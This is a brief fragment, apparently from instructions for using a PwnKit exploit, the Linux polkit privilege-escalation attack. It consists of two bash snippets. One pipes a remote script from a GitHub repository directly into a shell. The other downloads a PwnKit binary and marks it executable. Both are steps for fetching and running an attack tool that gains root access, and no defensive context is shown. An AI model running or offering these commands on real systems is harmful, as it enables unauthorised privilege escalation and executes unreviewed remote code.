...
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/abaker2010/PwnKit/main/PwnKit.sh)"
```
...
```bash
curl -fsSL https://raw.githubusercontent.com/abaker2010/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
